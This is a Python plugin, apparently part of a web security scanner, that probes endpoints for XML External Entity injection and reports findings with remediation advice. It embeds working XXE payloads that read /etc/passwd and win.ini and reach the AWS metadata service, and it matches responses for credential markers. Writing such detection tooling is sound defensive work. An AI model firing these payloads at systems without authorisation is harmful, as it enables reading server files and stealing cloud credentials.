"""
XML External Entity (XXE) Injection Scanner — detects file read,
SSRF via XXE, and blind XXE in XML-accepting endpoints.
"""
from __future__ import annotations
import time
from urllib.parse import urljoin
from ..base_plugin import BasePlugin, ScanTarget, RawFinding
from ..scan_context import ScanContext


# XXE payloads
XXE_FILE_READ = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''

XXE_FILE_READ_WIN = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>'''

XXE_SSRF_AWS = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>'''

XXE_PARAMETER_ENTITY = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://169.254.169.254/latest/meta-data/">
  %ext;
]>
<root>test</root>'''

# Detection patterns
UNIX_PASSWD_PATTERNS = ["root:x:0:0:", "root:*:0:0:", "daemon:x:1:1:"]
WIN_INI_PATTERNS = ["[fonts]", "[extensions]", "[mci extensions]"]
AWS_META_PATTERNS = ["ami-id", "instance-id", "security-credentials"]

# Endpoints that commonly accept XML
XML_ENDPOINTS = [
    "/api/xml", "/soap", "/ws", "/wsdl", "/xmlrpc.php",
    "/api/import", "/upload", "/api/webhook",
]


class XXEPlugin(BasePlugin):
    name = "XXE Injection Scanner"
    vuln_type = "xxe"

    async def scan(self, target: ScanTarget, ctx: ScanContext) -> list[RawFinding]:
        findings: list[RawFinding] = []

        # Check if the target accepts XML
        ct = target.content_type.lower() if target.content_type else ""
        accepts_xml = any(x in ct for x in ["xml", "soap"])

        # Also test form fields that might accept XML
        has_xml_fields = any(
            f.get("type") == "textarea" or f.get("type") == "file"
            for f in target.form_fields
        )

        if accepts_xml or has_xml_fields:
            await self._test_xxe(target.url, ctx, findings)

        # Only probe common XML endpoints on the base URL
        if target.url == ctx.target_url or target.url == ctx.target_url.rstrip("/"):
            base = ctx.target_url.rstrip("/")
            for path in XML_ENDPOINTS:
                endpoint = urljoin(base + "/", path.lstrip("/"))
                await self._test_xxe(endpoint, ctx, findings)

        return findings

    async def _test_xxe(
        self, url: str, ctx: ScanContext, findings: list[RawFinding]
    ) -> None:
        """Test a URL for XXE vulnerabilities."""
        xml_headers = {"Content-Type": "application/xml"}

        # Test 1: File read (Unix)
        resp = await self._send_request(
            ctx, url, method="POST", data=XXE_FILE_READ, headers=xml_headers
        )
        if resp and any(p in resp.text for p in UNIX_PASSWD_PATTERNS):
            findings.append(RawFinding(
                vuln_type="xxe_file_read",
                title=f"XXE: Local File Read at {url}",
                description=(
                    f"The endpoint {url} is vulnerable to XML External Entity injection. "
                    "The server processed an external entity that reads /etc/passwd, "
                    "confirming arbitrary file read capability."
                ),
                affected_url=url,
                severity="CRITICAL",
                payload=XXE_FILE_READ[:150],
                request_evidence=f"POST {url}\nContent-Type: application/xml\n\n{XXE_FILE_READ[:200]}",
                response_evidence=resp.text[:300],
                remediation=(
                    "Disable external entity processing in the XML parser. "
                    "Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                    "PHP: libxml_disable_entity_loader(true). "
                    "Python: defusedxml library."
                ),
                confidence=98,
                verified=True,
                business_impact=(
                    "Attackers can read any file on the server including source code, "
                    "configuration files, credentials, and private keys."
                ),
            ))
            return  # No need to test further

        # Test 2: File read (Windows)
        resp2 = await self._send_request(
            ctx, url, method="POST", data=XXE_FILE_READ_WIN, headers=xml_headers
        )
        if resp2 and any(p in resp2.text for p in WIN_INI_PATTERNS):
            findings.append(RawFinding(
                vuln_type="xxe_file_read",
                title=f"XXE: Local File Read (Windows) at {url}",
                description=(
                    f"The endpoint {url} is vulnerable to XXE. The server processed an "
                    "external entity reading c:\\windows\\win.ini."
                ),
                affected_url=url,
                severity="CRITICAL",
                payload=XXE_FILE_READ_WIN[:150],
                response_evidence=resp2.text[:300],
                remediation="Disable external entity processing in the XML parser.",
                confidence=98,
                verified=True,
            ))
            return

        # Test 3: SSRF via XXE (AWS metadata)
        resp3 = await self._send_request(
            ctx, url, method="POST", data=XXE_SSRF_AWS, headers=xml_headers
        )
        if resp3 and any(p in resp3.text for p in AWS_META_PATTERNS):
            findings.append(RawFinding(
                vuln_type="xxe_ssrf",
                title=f"XXE: SSRF to Cloud Metadata at {url}",
                description=(
                    f"The endpoint {url} is vulnerable to SSRF via XXE. The server fetched "
                    "the AWS EC2 instance metadata endpoint (169.254.169.254), potentially "
                    "exposing IAM credentials and instance configuration."
                ),
                affected_url=url,
                severity="CRITICAL",
                payload=XXE_SSRF_AWS[:150],
                response_evidence=resp3.text[:300],
                remediation=(
                    "Disable external entity processing. Block outbound requests to "
                    "169.254.169.254 at the network level."
                ),
                confidence=95,
                verified=True,
                business_impact=(
                    "Attackers can steal cloud IAM credentials, access internal services, "
                    "and potentially escalate to full cloud account compromise."
                ),
            ))
            return

        # Test 4: Blind XXE (timing-based)
        start = time.monotonic()
        resp4 = await self._send_request(
            ctx, url, method="POST", data=XXE_PARAMETER_ENTITY,
            headers=xml_headers, timeout=10.0,
        )
        elapsed = time.monotonic() - start

        if resp4 is not None:
            # If the server accepted the XML without error, it may be processing entities
            if resp4.status_code < 500 and elapsed > 3.0:
                findings.append(RawFinding(
                    vuln_type="xxe_blind",
                    title=f"Potential Blind XXE at {url}",
                    description=(
                        f"The endpoint {url} may be vulnerable to blind XXE. The server "
                        f"took {elapsed:.1f}s to respond to a parameter entity payload, "
                        "suggesting it attempted to resolve the external entity."
                    ),
                    affected_url=url,
                    severity="HIGH",
                    payload=XXE_PARAMETER_ENTITY[:150],
                    response_evidence=f"Response time: {elapsed:.1f}s, Status: {resp4.status_code}",
                    remediation="Disable external entity and parameter entity processing.",
                    confidence=60,
                    business_impact="Blind XXE can be escalated to data exfiltration via out-of-band channels.",
                ))
